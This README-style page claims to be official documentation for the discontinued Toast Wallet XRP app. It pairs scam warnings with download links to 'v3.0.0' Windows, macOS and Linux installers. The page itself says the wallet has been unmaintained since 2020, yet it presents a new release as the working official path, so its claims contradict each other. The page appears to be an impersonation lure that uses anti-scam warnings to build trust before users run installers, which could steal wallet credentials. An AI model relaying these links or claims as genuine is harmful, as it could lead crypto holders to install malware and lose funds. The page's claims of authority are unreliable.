<div align="center">

# Toast Wallet: What It Is, What Happened, and Is It Still Safe to Use?

**Built in 2017, discontinued in 2020, and still actively targeted by scammers today.**

![Docs](https://img.shields.io/badge/DOCS-toast--wallet--docs-555555?style=for-the-badge) [![GitHub Org](https://img.shields.io/badge/GITHUB-Toast--Wallet-6f42c1?style=for-the-badge)](https://github.com/Toast-Wallet) ![License](https://img.shields.io/badge/LICENSE-GPL--2.0-97ca00?style=for-the-badge) ![Release](https://img.shields.io/badge/RELEASE-v3.0.0-0078D6?style=for-the-badge)

</div>

---

## 📥 Downloads — v3.0.0

<div align="center">

[![Download for Windows](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-WINDOWS-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) [![Download for macOS](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-MACOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) [![Download for Linux](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-LINUX-E95420?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage)

</div>

| Platform | Requirements | File | Checksum |
|---|---|---|---|
| 🪟 Windows | Windows desktop (64-bit) | [ToastWallet.Setup.3.0.0.exe](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-windows.sha256) |
| 🍎 macOS | macOS desktop | [ToastWallet-3.0.0.dmg](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-macos.sha256) |
| 🐧 Linux | Most modern 64-bit distributions, no install needed | [ToastWallet-3.0.0-x86_64.AppImage](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-linux.sha256) |

Verify your download against the matching SHA256 file before running any installer — all files
and checksums are also listed together on the
[**official v3.0.0 release page**](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> ⚠️ **Only download from this GitHub release page or the [official Toast-Wallet GitHub org](https://github.com/Toast-Wallet).**
> toastwallet.com is currently unreachable, and `toastwallet.app` is a known phishing clone —
> see our [full scam warning list](./toast-wallet-scam-warning-list.md).

---

Toast Wallet is a free, open-source, non-custodial wallet for XRP (Ripple), built in 2017 by
**StarStone Ltd**, a small startup founded by Richard Holland in Dunedin, New Zealand. It ran on
iOS, Android, Windows, Mac, and Linux, and it never held your funds
itself — like every XRP wallet, it was simply a client that talked to the public XRP Ledger,
where your coins actually live.

**Is it still around?** Not in active development. In mid-2020, the Toast Wallet team pulled the
app from app stores and stepped back from ongoing development, citing frustration with how Ripple
was treating community developers at the time. The official GitHub repository is explicit about
this: *"Please note Toast Wallet is no longer actively maintained..."*

**Does that mean your XRP is gone?** No. This is the single most important thing to understand if
you're reading this because you just remembered you have an old Toast Wallet account. Your XRP
lives on the XRP Ledger, not inside the Toast Wallet app. As long as you still have your
credentials (see our [passphrase, recovery phrase, backup code, and secret key guide]
(./passphrase-vs-recovery-phrase-vs-backup-code-vs-secret-key.md)), your funds are exactly
where you left them and can still be recovered and moved.

**Why does this page exist?** Because the Toast Wallet name has been aggressively exploited since
this project stepped back from active development. A copycat app called "Toast Plus" appeared on
official app stores and stole millions of dollars from people who thought they were using the real
thing. A phishing site cloned our official recovery page and drained anything imported into it.
Several SEO marketing sites now impersonate Toast Wallet with fabricated claims we never made. This
documentation exists to keep the real, official resources easy to find — and to make sure nobody
else falls for the fakes.

**In short:**
- Toast Wallet was legitimate, well-regarded, and open-source.
- It is discontinued but your XRP is safe on the ledger if you still have your credentials.
- "Toast Plus" and several clone websites are **not** Toast Wallet and have stolen real money.
- toastwallet.com is currently unavailable — the Windows and Mac desktop installers are the
  working official path today.

---

## ⚠️ Known Scams — Do Not Use These

- **The "Toast Plus" fraudulent app** (App Store / Google Play, package `co.peninsulasoftware.toastwallet`) — a lookalike app, not affiliated with Toast Wallet, that has stolen an estimated **$5M+ in XRP**. Full details: [The Toast Plus App Scam](./toast-plus-app-scam.md).
- **The toastwallet.app phishing site** — a clone of the official recovery page that drains any wallet imported into it. Full details: [Toast Wallet Phishing Sites](./toast-wallet-phishing-sites.md).
- **Marketing clone sites** — `xrp-toastwallet.com`, `toast-wallet.com`, `en-toastwallet.com`, `toast-wallet.net`. Not official, and misrepresent how Toast Wallet actually works.
- **Paid "recovery service" DMs** — always a follow-up scam; no one can reverse an XRP Ledger transaction.

See the [full Toast Wallet scam warning list](./toast-wallet-scam-warning-list.md). If you believe you've been scammed, file a report at [ic3.gov](https://www.ic3.gov).

## Related Articles

- [How to Access an Old Toast Wallet](./access-old-toast-wallet.md)
- [Toast Wallet by Platform](./toast-wallet-by-platform.md)
- [How to Set Up and Use Toast Wallet](./how-to-set-up-use-toast-wallet.md)
- [Account Support and Closing a Wallet](./toast-wallet-account-support-delete.md)
- [Toast Wallet FAQ & Glossary](./faq-glossary.md)
- [Is Toast Wallet Safe? Full Security Review](./is-toast-wallet-safe-review.md)
- [Toast Wallet Scam Warning List](./toast-wallet-scam-warning-list.md)
- [How to Recover XRP From an Old Toast Wallet](./how-to-recover-xrp-toast-wallet.md)
